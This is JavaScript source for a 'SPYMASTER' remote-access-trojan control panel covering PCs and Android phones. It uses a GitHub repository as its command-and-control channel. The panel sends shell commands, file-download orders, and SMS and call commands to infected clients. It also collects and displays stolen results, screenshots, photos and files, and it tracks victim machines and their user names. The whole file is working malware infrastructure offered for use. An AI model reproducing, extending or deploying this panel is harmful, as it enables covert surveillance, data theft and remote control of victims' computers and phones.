// ============= SPYMASTER ULTIMATE C2 PANEL =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
// ВЕРСИЯ: 4.0 (PC + ANDROID)

// ============= КОНФИГУРАЦИЯ =============
let GITHUB_USERNAME = "твой_логин";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Загрузка сохранённых данных
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
    }
} catch(e) {}

if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB:");
        if (GITHUB_TOKEN) localStorage.setItem("github_token", GITHUB_TOKEN);
    }
}

if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ LOGIN GITHUB:");
        if (GITHUB_USERNAME) localStorage.setItem("github_username", GITHUB_USERNAME);
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

// PC переменные
let pcClients = [];
let pcSeenFiles = [];
let pcAutoRefresh = null;
let pcCurrentClient = "all";

// Android переменные
let androidDevices = [];
let androidSeenFiles = [];
let androidAutoRefresh = null;
let androidCurrentDevice = "all";

let currentMode = "pc";

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system", isAndroid = false) {
    const containerId = isAndroid ? "androidLogContainer" : "logContainer";
    const logContainer = document.getElementById(containerId);
    if (!logContainer) return;
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

function isBase64Image(str) {
    if (!str || typeof str !== 'string') return false;
    return str.startsWith('iVBORw0KGgo') || str.startsWith('/9j/4AAQ');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============= ОТПРАВКА КОМАНД (ОБЩАЯ) =============
async function sendCommandToGithub(command, isAndroid = false) {
    const targetClient = isAndroid ? (androidCurrentDevice || "all") : (pcCurrentClient || "all");
    let finalCommand = command;
    if (targetClient !== "all") {
        finalCommand = `@${targetClient} ${command}`;
    }
    
    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system", isAndroid);
    
    try {
        let response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
        
        let currentContent = "";
        let sha = null;
        
        if (response.status === 200) {
            const data = await response.json();
            currentContent = atob(data.content);
            sha = data.sha;
        }
        
        const newContent = currentContent + finalCommand + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        const putResponse = await fetch(`${API_URL}/commands.txt`, {
            method: "PUT",
            headers: HEADERS,
            body: JSON.stringify(putData)
        });
        
        if (putResponse.status === 200 || putResponse.status === 201) {
            addLog(`✅ ОТПРАВЛЕНО: ${command}`, "success", isAndroid);
            showNotification(`✅ ${command}`, "success");
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${putResponse.status}`, "error", isAndroid);
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error", isAndroid);
        return false;
    }
}

// ============= ПАРСИНГ КЛИЕНТОВ =============
function parseClientInfo(content, isAndroid = false) {
    if (content.includes("[Connected]") || content.includes("PC:") || content.includes("Device:")) {
        let pcMatch = content.match(/PC:\s*([^\n]+)/);
        let deviceMatch = content.match(/Device:\s*([^\n]+)/);
        let modelMatch = content.match(/MODEL:\s*([^\n]+)/i);
        
        if (isAndroid && (deviceMatch || modelMatch)) {
            const deviceId = deviceMatch ? deviceMatch[1].trim() : (modelMatch ? modelMatch[1].trim() : "Unknown");
            if (!androidDevices.find(d => d.id === deviceId)) {
                androidDevices.push({
                    id: deviceId,
                    info: content.substring(0, 200),
                    firstSeen: new Date().toLocaleString()
                });
                updateAndroidDevicesList();
                addLog(`📱 НОВОЕ ANDROID УСТРОЙСТВО: ${deviceId}`, "client", true);
                showNotification(`Новое Android устройство: ${deviceId}`, "success");
            }
        } else if (pcMatch) {
            const clientId = pcMatch[1].trim();
            const userMatch = content.match(/User:\s*([^\n]+)/);
            const userName = userMatch ? userMatch[1].trim() : "Unknown";
            
            if (!pcClients.find(c => c.id === clientId)) {
                pcClients.push({
                    id: clientId,
                    user: userName,
                    firstSeen: new Date().toLocaleString()
                });
                updatePCClientsList();
                addLog(`💻 НОВЫЙ PC КЛИЕНТ: ${clientId} (${userName})`, "client", false);
                showNotification(`Новый PC клиент: ${clientId}`, "success");
            }
        }
    }
}

// ============= ОТОБРАЖЕНИЕ СКРИНШОТА =============
function displayScreenshot(base64Data, filename, isAndroid = false) {
    const gridId = isAndroid ? "androidPhotosGrid" : "screensGrid";
    const grid = document.getElementById(gridId);
    if (!grid) return;
    
    const card = document.createElement("div");
    card.className = "screenshot-card";
    card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:10px;overflow:hidden;background:#0a0e27;transition:transform 0.2s";
    card.onmouseover = () => card.style.transform = "scale(1.02)";
    card.onmouseout = () => card.style.transform = "scale(1)";
    
    const img = document.createElement("img");
    img.src = `data:image/png;base64,${base64Data}`;
    img.style.cssText = "width:100%;height:150px;object-fit:cover;background:#0a0e27";
    
    card.onclick = () => {
        const modal = document.createElement("div");
        modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
        const modalImg = document.createElement("img");
        modalImg.src = `data:image/png;base64,${base64Data}`;
        modalImg.style.cssText = "max-width:90%;max-height:90%;border:2px solid #00ff41;border-radius:10px";
        modal.appendChild(modalImg);
        modal.onclick = () => modal.remove();
        document.body.appendChild(modal);
    };
    
    const info = document.createElement("div");
    info.style.cssText = "padding:8px;font-size:10px;text-align:center";
    info.innerText = filename;
    
    card.appendChild(img);
    card.appendChild(info);
    
    if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
        grid.innerHTML = "";
    }
    grid.insertBefore(card, grid.firstChild);
    
    while (grid.children.length > 20) {
        grid.removeChild(grid.lastChild);
    }
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults(isAndroid = false) {
    try {
        const response = await fetch(API_URL, { headers: HEADERS });
        if (!response.ok) return;
        
        const files = await response.json();
        if (!Array.isArray(files)) return;
        
        const results = files.filter(f => f.name.startsWith("result_") && f.name.endsWith(".txt"));
        const screenshotFiles = files.filter(f => f.name.startsWith("screenshot_"));
        const photoFiles = files.filter(f => f.name.startsWith("photo_"));
        const fileDownloads = files.filter(f => f.name.startsWith("file_"));
        
        if (isAndroid) {
            document.getElementById("androidDevicesCount").innerText = androidDevices.length;
            document.getElementById("androidGpsCount").innerText = screenshotFiles.length;
        } else {
            document.getElementById("resultsCount").innerText = results.length;
            document.getElementById("screensCount").innerText = screenshotFiles.length;
            document.getElementById("clientsCount").innerText = pcClients.length;
        }
        
        // Обработка результатов
        const allResultFiles = isAndroid ? [...results, ...photoFiles] : results;
        for (const file of allResultFiles) {
            const seenList = isAndroid ? androidSeenFiles : pcSeenFiles;
            if (!seenList.includes(file.name)) {
                seenList.push(file.name);
                const content = await fetch(file.download_url).then(r => r.text());
                addLog(`📥 ${file.name}`, "result", isAndroid);
                const lines = content.split('\n').slice(0, 5);
                for (const line of lines) {
                    if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result", isAndroid);
                }
                parseClientInfo(content, isAndroid);
            }
        }
        
        // Обработка скриншотов/фото
        const allImages = isAndroid ? photoFiles : screenshotFiles;
        for (const file of allImages) {
            const seenList = isAndroid ? androidSeenFiles : pcSeenFiles;
            if (!seenList.includes(file.name)) {
                seenList.push(file.name);
                const content = await fetch(file.download_url).then(r => r.text());
                
                if (isBase64Image(content)) {
                    addLog(`📸 ${file.name}`, "success", isAndroid);
                    displayScreenshot(content, file.name, isAndroid);
                } else if (file.name.endsWith('.png')) {
                    addLog(`📸 ${file.name}`, "success", isAndroid);
                    const gridId = isAndroid ? "androidPhotosGrid" : "screensGrid";
                    const grid = document.getElementById(gridId);
                    if (grid) {
                        const card = document.createElement("div");
                        card.className = "screenshot-card";
                        const img = document.createElement("img");
                        img.src = file.download_url + "?t=" + Date.now();
                        img.style.cssText = "width:100%;height:150px;object-fit:cover";
                        card.onclick = () => window.open(file.download_url, '_blank');
                        const info = document.createElement("div");
                        info.style.cssText = "padding:8px;font-size:10px;text-align:center";
                        info.innerText = file.name;
                        card.appendChild(img);
                        card.appendChild(info);
                        if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
                            grid.innerHTML = "";
                        }
                        grid.insertBefore(card, grid.firstChild);
                    }
                }
            }
        }
        
        // Обновление списка файлов для PC
        if (!isAndroid) {
            const filesList = document.getElementById("filesList");
            if (filesList) {
                if (fileDownloads.length > 0) {
                    filesList.innerHTML = "";
                    for (const file of fileDownloads.slice(-20).reverse()) {
                        const item = document.createElement("div");
                        item.className = "file-item";
                        item.innerHTML = `
                            <span>📄 ${file.name}</span>
                            <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
                        `;
                        filesList.appendChild(item);
                    }
                } else {
                    filesList.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
                }
            }
        }
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error", isAndroid);
    }
}

// ============= ОБНОВЛЕНИЕ СПИСКОВ =============
function updatePCClientsList() {
    const select = document.getElementById("clientSelect");
    if (select) {
        select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
        for (const client of pcClients) {
            select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
        }
    }
    
    const clientsDiv = document.getElementById("clientsList");
    if (clientsDiv) {
        if (pcClients.length > 0) {
            clientsDiv.innerHTML = "";
            for (const client of pcClients) {
                const card = document.createElement("div");
                card.className = "client-card";
                card.onclick = () => {
                    document.getElementById("clientSelect").value = client.id;
                    pcCurrentClient = client.id;
                    addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${client.id}`, "success");
                };
                card.innerHTML = `
                    <div style="font-weight:bold">🖥️ ${escapeHtml(client.id)}</div>
                    <div style="font-size:11px;color:#888">👤 ${escapeHtml(client.user)}</div>
                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>
                `;
                clientsDiv.appendChild(card);
            }
        } else {
            clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
        }
    }
}

function updateAndroidDevicesList() {
    const select = document.getElementById("androidClientSelect");
    if (select) {
        select.innerHTML = '<option value="all">📱 ВСЕ УСТРОЙСТВА</option>';
        for (const device of androidDevices) {
            select.innerHTML += `<option value="${device.id}">📱 ${device.id}</option>`;
        }
    }
    
    const devicesDiv = document.getElementById("androidDevicesList");
    if (devicesDiv) {
        if (androidDevices.length > 0) {
            devicesDiv.innerHTML = "";
            for (const device of androidDevices) {
                const card = document.createElement("div");
                card.className = "client-card";
                card.onclick = () => {
                    document.getElementById("androidClientSelect").value = device.id;
                    androidCurrentDevice = device.id;
                    addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${device.id}`, "success", true);
                };
                card.innerHTML = `
                    <div style="font-weight:bold">📱 ${escapeHtml(device.id)}</div>
                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(device.firstSeen)}</div>
                `;
                devicesDiv.appendChild(card);
            }
        } else {
            devicesDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных устройств</div>';
        }
    }
}

// ============= ОЧИСТКА КОМАНД =============
async function clearCommands() {
    try {
        const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
        if (response.status === 200) {
            const data = await response.json();
            await fetch(`${API_URL}/commands.txt`, {
                method: "PUT",
                headers: HEADERS,
                body: JSON.stringify({
                    message: "Clear commands",
                    content: btoa(""),
                    sha: data.sha,
                    branch: "main"
                })
            });
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success", false);
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error", false);
    }
}

// ============= ТЕСТ ПОДКЛЮЧЕНИЯ =============
async function testConnection() {
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system", false);
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        if (response.ok) {
            const user = await response.json();
            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success", false);
            const indicator = document.getElementById("statusIndicator");
            const statusText = document.getElementById("statusText");
            if (indicator) indicator.classList.add("online");
            if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            
            // Также тестируем для Android
            const androidIndicator = document.getElementById("androidStatusIndicator");
            const androidStatusText = document.getElementById("androidStatusText");
            if (androidIndicator) androidIndicator.classList.add("online");
            if (androidStatusText) androidStatusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error", false);
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error", false);
        return false;
    }
}

// ============= АВТООБНОВЛЕНИЕ =============
function startAutoRefresh() {
    if (pcAutoRefresh) clearInterval(pcAutoRefresh);
    if (androidAutoRefresh) clearInterval(androidAutoRefresh);
    
    pcAutoRefresh = setInterval(() => loadResults(false), 5000);
    androidAutoRefresh = setInterval(() => loadResults(true), 5000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system", false);
}

// ============= ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =============
function switchMode(mode) {
    currentMode = mode;
    document.querySelectorAll('.mode-content').forEach(el => el.classList.remove('active'));
    document.getElementById(`${mode}Mode`).classList.add('active');
    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector(`.mode-btn[data-mode="${mode}"]`).classList.add('active');
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
function init() {
    addLog("🐀 SPYMASTER ULTIMATE C2 PANEL v4.0 ЗАПУЩЕН", "system", false);
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system", false);
    addLog("📱 ANDROID ПАНЕЛЬ ГОТОВА К РАБОТЕ", "system", true);
    
    // Добавляем стили
    if (!document.querySelector("#dynamic-styles")) {
        const style = document.createElement('style');
        style.id = "dynamic-styles";
        style.textContent = `
            @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
            .log-entry { background: rgba(10,14,39,0.8); border-radius: 5px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
            .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
            .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
            .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
            .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
            .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 10px; overflow: hidden; background: #0a0e27; transition: transform 0.2s; }
            .screenshot-card:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
            .client-card { background: #0a0e27; border: 1px solid #00ff41; border-radius: 10px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.3s; }
            .client-card:hover { background: #1a1f4e; transform: translateX(5px); }
            .file-item { background: #0a0e27; border: 1px solid #00ff41; border-radius: 8px; padding: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
            .file-download { background: #1a1f4e; border: none; color: #00ff41; padding: 5px 10px; cursor: pointer; border-radius: 5px; }
            .empty-message { text-align: center; padding: 40px; color: #444; }
            .help-card { background: #0a0e27; border: 1px solid #00ff41; border-radius: 8px; padding: 10px; font-size: 12px; }
            .help-card code { color: #ffaa00; }
        `;
        document.head.appendChild(style);
    }
    
    testConnection();
    startAutoRefresh();
    loadResults(false);
    loadResults(true);
    
    // ============= PC КНОПКИ =============
    document.querySelectorAll('#pcMode .cmd-btn, #pcMode .cmd-small').forEach(btn => {
        if (btn.id !== 'sendCustomBtn' && btn.id !== 'downloadBtn' && btn.id !== 'shellBtn') {
            btn.onclick = () => {
                const cmd = btn.getAttribute('data-cmd');
                if (cmd) sendCommandToGithub(cmd, false);
            };
        }
    });
    
    document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
        const input = document.getElementById("customCmd");
        if (input && input.value) {
            sendCommandToGithub(input.value, false);
            input.value = '';
        }
    });
    
    document.getElementById("downloadBtn")?.addEventListener("click", () => {
        const input = document.getElementById("downloadPath");
        if (input && input.value) {
            sendCommandToGithub(`/download ${input.value}`, false);
        }
    });
    
    document.getElementById("shellBtn")?.addEventListener("click", () => {
        const input = document.getElementById("shellCmd");
        if (input && input.value) {
            sendCommandToGithub(`/cmd ${input.value}`, false);
        }
    });
    
    document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
    document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults(false));
    
    document.getElementById("clientSelect")?.addEventListener("change", (e) => {
        pcCurrentClient = e.target.value;
        addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${pcCurrentClient === "all" ? "ВСЕ" : pcCurrentClient}`, "success", false);
    });
    
    // ============= ANDROID КНОПКИ =============
    document.querySelectorAll('#androidMode .cmd-btn').forEach(btn => {
        btn.onclick = () => {
            const cmd = btn.getAttribute('data-android-cmd');
            if (cmd) sendCommandToGithub(cmd, true);
        };
    });
    
    document.getElementById("androidSendCustomBtn")?.addEventListener("click", () => {
        const input = document.getElementById("androidCustomCmd");
        if (input && input.value) {
            sendCommandToGithub(input.value, true);
            input.value = '';
        }
    });
    
    document.getElementById("androidSmsBtn")?.addEventListener("click", () => {
        const number = document.getElementById("androidSmsNumber")?.value;
        const text = document.getElementById("androidSmsText")?.value;
        if (number && text) {
            sendCommandToGithub(`/sms:${number} ${text}`, true);
        }
    });
    
    document.getElementById("androidCallBtn")?.addEventListener("click", () => {
        const number = document.getElementById("androidCallNumber")?.value;
        if (number) {
            sendCommandToGithub(`/call:${number}`, true);
        }
    });
    
    document.getElementById("androidFilesBtn")?.addEventListener("click", () => {
        const path = document.getElementById("androidFilePath")?.value || "/sdcard";
        sendCommandToGithub(`/files ${path}`, true);
    });
    
    document.getElementById("androidShellBtn")?.addEventListener("click", () => {
        const cmd = document.getElementById("androidShellCmd")?.value;
        if (cmd) {
            sendCommandToGithub(`/cmd ${cmd}`, true);
        }
    });
    
    document.getElementById("androidClientSelect")?.addEventListener("change", (e) => {
        androidCurrentDevice = e.target.value;
        addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${androidCurrentDevice === "all" ? "ВСЕ" : androidCurrentDevice}`, "success", true);
    });
    
    // ============= ВКЛАДКИ PC =============
    document.querySelectorAll('#pcMode .tab-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('#pcMode .tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('#pcMode .tab-content').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');
            const tab = document.getElementById(`${btn.getAttribute('data-tab')}Tab`);
            if (tab) tab.classList.add('active');
        };
    });
    
    // ============= ВКЛАДКИ ANDROID =============
    document.querySelectorAll('#androidMode .tab-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('#androidMode .tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('#androidMode .tab-content').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');
            const tab = document.getElementById(`android${btn.getAttribute('data-android-tab').charAt(0).toUpperCase() + btn.getAttribute('data-android-tab').slice(1)}Tab`);
            if (tab) tab.classList.add('active');
        };
    });
    
    // ============= ОЧИСТКА ВСЕГО =============
    const clearAllBtn = document.getElementById("clearAllBtn");
    if (clearAllBtn) {
        clearAllBtn.onclick = () => {
            if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
                (async () => {
                    const response = await fetch(API_URL, { headers: HEADERS });
                    if (response.ok) {
                        const files = await response.json();
                        const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
                        let deleted = 0;
                        for (const file of files) {
                            if (protectedFiles.includes(file.name)) continue;
                            await fetch(`${API_URL}/${file.name}`, {
                                method: "DELETE",
                                headers: HEADERS,
                                body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
                            });
                            deleted++;
                            await new Promise(r => setTimeout(r, 100));
                        }
                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success", false);
                        pcSeenFiles = [];
                        androidSeenFiles = [];
                        pcClients = [];
                        androidDevices = [];
                        loadResults(false);
                        loadResults(true);
                    }
                })();
            }
        };
    }
    
    // ============= ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =============
    document.querySelectorAll('.mode-btn').forEach(btn => {
        btn.onclick = () => {
            switchMode(btn.getAttribute('data-mode'));
        };
    });
    
    addLog("✅ ИНТЕРФЕЙС ЗАГРУЖЕН", "success", false);
    addLog("✅ ANDROID ИНТЕРФЕЙС ГОТОВ", "success", true);
}

// Запуск
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}